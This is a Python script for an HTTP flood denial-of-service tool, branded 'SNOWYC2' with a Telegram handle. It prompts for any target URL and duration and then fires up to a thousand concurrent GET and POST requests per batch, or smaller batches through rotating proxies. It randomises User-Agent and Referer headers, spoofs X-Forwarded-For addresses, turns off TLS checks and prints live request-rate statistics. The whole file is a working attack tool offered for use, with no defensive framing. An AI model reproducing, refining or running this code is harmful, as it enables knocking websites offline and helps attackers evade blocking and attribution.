import asyncio
import time
import sys
import os
import aiohttp
import httpx
from random import choice

# Load lines from file
def load_lines(file):
    try:
        with open(file, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

REFERERS = load_lines("refs.txt")
USER_AGENTS = load_lines("uas.txt")
PROXIES = load_lines("STS.txt")

REQUEST_TIMEOUT = 10

class AttackEngine:
    def __init__(self, target, duration, use_proxies):
        self.target = target
        self.duration = duration
        self.use_proxies = use_proxies
        self.start_time = time.time()
        self.stats = {'total': 0, 'success': 0, 'errors': 0, 'rps': 0, 'peak_rps': 0}
        self.max_concurrent = 50 if self.use_proxies else 1000
        self.proxy_index = 0

    def update_stats(self, results):
        self.stats['total'] += len(results)
        self.stats['success'] += results.count("SUCCESS")
        self.stats['errors'] += results.count("ERROR")
        elapsed = time.time() - self.start_time
        rps = self.stats['total'] / elapsed if elapsed > 0 else 0
        self.stats['rps'] = rps
        self.stats['peak_rps'] = max(self.stats['peak_rps'], rps)

    def next_proxy(self):
        proxy = PROXIES[self.proxy_index % len(PROXIES)]
        self.proxy_index += 1
        return proxy

    async def make_request_proxy(self, session):
        method = choice(["GET", "POST"])
        headers = {
            "User-Agent": choice(USER_AGENTS),
            "Referer": choice(REFERERS),
            "X-Forwarded-For": f"{self.stats['total'] % 255}.{self.stats['success'] % 255}.1.1"
        }
        proxy = f"http://{self.next_proxy()}"
        try:
            if method == "GET":
                async with session.get(self.target, headers=headers, proxy=proxy, ssl=False) as resp:
                    return "SUCCESS" if resp.status == 200 else "ERROR"
            else:
                async with session.post(self.target, headers=headers, proxy=proxy, ssl=False) as resp:
                    return "SUCCESS" if resp.status == 200 else "ERROR"
        except:
            return "ERROR"

    async def make_request_http2(self, client):
        method = choice(["GET", "POST"])
        headers = {
            "User-Agent": choice(USER_AGENTS),
            "Referer": choice(REFERERS),
            "X-Forwarded-For": f"{self.stats['total'] % 255}.{self.stats['success'] % 255}.2.2"
        }
        try:
            if method == "GET":
                resp = await client.get(self.target, headers=headers)
            else:
                resp = await client.post(self.target, headers=headers)
            return "SUCCESS" if resp.status_code == 200 else "ERROR"
        except:
            return "ERROR"

    async def run_attack(self):
        if self.use_proxies:
            connector = aiohttp.TCPConnector(limit=None, ssl=False)
            timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                while time.time() - self.start_time < self.duration:
                    tasks = [self.make_request_proxy(session) for _ in range(self.max_concurrent)]
                    results = await asyncio.gather(*tasks, return_exceptions=False)
                    self.update_stats(results)
                    self.print_status()
        else:
            limits = httpx.Limits(max_connections=self.max_concurrent)
            async with httpx.AsyncClient(http2=True, timeout=REQUEST_TIMEOUT, limits=limits, verify=False) as client:
                while time.time() - self.start_time < self.duration:
                    tasks = [self.make_request_http2(client) for _ in range(self.max_concurrent)]
                    results = await asyncio.gather(*tasks, return_exceptions=False)
                    self.update_stats(results)
                    self.print_status()
        self.print_summary()

    def print_status(self):
        os.system("clear" if os.name != "nt" else "cls")
        elapsed = time.time() - self.start_time
        remaining = max(0, self.duration - elapsed)
        print(f"\nSNOWYC2 - T.ME/STSVKINGDOM")
        print("=" * 60)
        print(f"METHOD: C-ECLIPSE | TARGET: {self.target} | TIME: {self.duration}s")
        print("=" * 60)
        print(f"REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print(f"RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
        print(f"TIME LEFT: {remaining:.1f}s")
        print("=" * 60)

    def print_summary(self):
        elapsed = time.time() - self.start_time
        print("\nATTACK COMPLETED")
        print("=" * 60)
        print(f"TARGET: {self.target}")
        print(f"DURATION: {elapsed:.1f}s")
        print(f"TOTAL REQUESTS: {self.stats['total']}")
        print(f"SUCCESS: {self.stats['success']}")
        print(f"ERRORS: {self.stats['errors']}")
        print(f"AVG RPS: {self.stats['total'] / elapsed:.1f}")
        print("=" * 60)

def main():
    print("\nSNOWYC2 - T.ME/STSVKINGDOM")
    print("=" * 60)

    target = input("TARGET: ").strip()
    if not target.startswith("http"):
        target = "http://" + target

    try:
        duration = int(input("TIME (seconds): ").strip())
    except:
        print("Invalid time input.")
        return

    use_proxies = input("PROXY SUPPORT? (y/n): ").strip().lower() == "y"

    engine = AttackEngine(target, duration, use_proxies)
    try:
        asyncio.run(engine.run_attack())
    except KeyboardInterrupt:
        print("\nAttack stopped.")
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()
